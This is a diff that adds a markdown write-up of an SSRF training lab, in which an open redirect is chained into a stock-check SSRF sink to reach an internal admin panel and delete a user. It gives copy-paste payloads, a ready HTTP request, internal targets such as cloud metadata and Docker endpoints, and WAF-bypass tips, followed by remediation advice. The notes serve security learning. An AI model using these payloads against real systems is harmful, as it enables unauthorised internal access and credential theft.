@@ -646,3 +646,189 @@ Send → User deleted → Lab solved.
 - Enforce egress firewall rules  
 
 ---
+
+# ⭐ SSRF Lab-4 (Open Redirect → Internal Admin Bypass)
+
+---
+
+## 🔹 One-line summary
+Use an open-redirect endpoint to bypass SSRF restrictions and make the server request an internal admin panel, then delete user **carlos**.
+
+---
+
+## 🔹 What is this topic? (short)
+The application exposes a SSRF sink via:
+```
+stockApi=
+```
+but restricts it to same-origin *paths* only.  
+Separately, an endpoint:
+```
+/product/nextProduct?path=<VALUE>
+```
+reflects `<VALUE>` into the `Location:` header (open redirect).  
+Chaining the SSRF sink with this **open redirect** lets the backend follow the redirect to internal hosts (e.g., `http://192.168.0.12:8080/admin`).
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- Redirect parameters are often trusted and ignored by devs.  
+- Backends commonly follow redirects automatically.  
+- SSRF + open-redirect = full internal access (admin panels, metadata, dev tools).  
+- Attackers can delete users, read secrets, pivot laterally, or exfiltrate cloud credentials.
+
+---
+
+## 🔹 Real-world scenarios (out-of-the-box)
+- Marketing redirect `/go?to=` chained with SSRF → internal banking endpoints.  
+- Image/next-product redirect that can point to `http://169.254.169.254/latest/meta-data/`.  
+- Redirect chains that transform “same-origin” path into arbitrary remote URL.  
+- Mobile apps blocking external domains but allowing same-origin paths → bypass via redirect.
+
+---
+
+## 🔹 Common payloads / attack patterns
+```
+/product/nextProduct?path=http://192.168.0.12:8080/admin
+/product/nextProduct?path=http://127.0.0.1:8080/admin
+/product/nextProduct?path=http://169.254.169.254/latest/meta-data/
+```
+
+Encoded delete payload example (percent-encoded `?`):
+```
+/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
+```
+
+Final SSRF sink payload (insert into `stockApi=`):
+```
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
+```
+
+---
+
+## 🔹 High-value endpoints to try after redirect bypass
+```
+/admin
+/admin/delete?username=...
+/manage
+/debug
+/actuator/env
+/metrics
+/swagger
+169.254.169.254/latest/meta-data/
+127.0.0.1:2375/containers/json
+kubernetes.default.svc/api
+```
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+1. **Capture baseline stock request**  
+   - Proxy **ON** → Click *Check stock* on any product. Capture request and **Send to Repeater**.
+
+2. **Confirm SSRF sink only accepts same-origin paths**  
+   - Try:
+     ```
+     stockApi=http://192.168.0.12:8080/admin
+     ```
+     → Expect: **blocked / rejected** (server only allows `/product/*` paths).
+
+3. **Find open redirect**  
+   - Navigate product → Click *Next product*. Intercept:
+     ```
+     GET /product/nextProduct?path=/product?productId=2
+     ```
+     - Response header:
+       ```
+       Location: /product?productId=2
+       ```
+     - **SS#1:** take screenshot showing the captured redirect and `Location:` header.
+
+4. **Craft redirect payload pointing to internal admin**  
+   - Replace `path=` value:
+     ```
+     /product/nextProduct?path=http://192.168.0.12:8080/admin
+     ```
+   - Confirm calling that path (as same-origin) will return a redirect leading to the admin host.
+
+5. **Insert redirect payload into SSRF sink**  
+   - Final SSRF invocation:
+     ```
+     stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+     ```
+   - Send request in Repeater after URL encode → confirm admin HTML returned (SSRF follows redirect).
+
+6. **Encode delete action and send via SSRF**  
+   - Percent-encode query-string `?` and `=` to avoid filter issues:
+     ```
+     /product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
+     ```
+   - Put into sink:
+     ```
+     stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
+     ```
+   - **SS#2:** take screenshot showing Repeater request with encoded payload and the response confirming deletion.
+   - Result: **Carlos deleted** → Lab solved.
+
+---
+
+## 🔹 PoC / Repeater-ready example (copy/paste & edit)
+```http
+GET /product/stock/check?productId=1&storeId=1 HTTP/1.1
+Host: <LAB_HOST>
+User-Agent: Mozilla/5.0
+Accept: */*
+Connection: close
+
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3Fusername%3Dcarlos
+```
+
+> Note: URL-encode payloads when pasting into a browser. Use `%3F` for `?`, `%3D` for `=`, etc., if required by the app/WAF.
+
+---
+
+## 🔹 Evidence (Screenshots)
+- **SS#1 — Open Redirect discovered**  
+  
+  ![open redirect path](../images/open-redirect-path.png)
+  
+- **SS#2 — Encoded SSRF -> Admin delete**  
+  
+ ![stock api open redirect path replace url encode](../images/ssrf-admin-delete.png)
+  
+---
+
+## 🔹 Troubleshooting / tips
+- If redirects are relative, prefix with `http://<HOST>` when testing.  
+- If server strips `http://`, try `//192.168.0.12:8080/admin` or encoded variants.  
+- If WAF blocks `http:`, try double-encoding the `:` or using `//host` style redirect.  
+- Watch for multiple redirect hops; capture full redirect chain in Burp.
+
+---
+
+## 🔹 Fixes / remediation (what to report)
+- Do **not** accept user-controlled redirect destinations.  
+- Disable automatic redirect-following for SSRF-reachable code paths.  
+- Use **allowlist** of full URLs (or only allow fixed relative paths).  
+- Validate redirect parameters — only allow relative internal paths, never absolute URLs.  
+- Apply egress filtering to prevent backend from reaching admin ports and metadata endpoints.  
+- Require authentication on internal admin interfaces (don’t assume internal origin = trusted).
+
+---
+
+## 🔹 Pentest checklist (copyable)
+1. Find SSRF sink → test same-origin-only behavior.  
+2. Search for endpoints that reflect user input into `Location:` headers.  
+3. Confirm redirect follow behavior.  
+4. Chain redirect inside SSRF sink.  
+5. Encode query chars (`?`, `=`) if needed.  
+6. Capture PoC requests + responses, take screenshots.  
+7. Recommend allowlist + egress filtering + disable redirect follow.
+
+---
+
+## 🔹 One-line memory cue
+```
+If stockApi follows redirects → point it to a redirect that lands on the internal admin.
+```
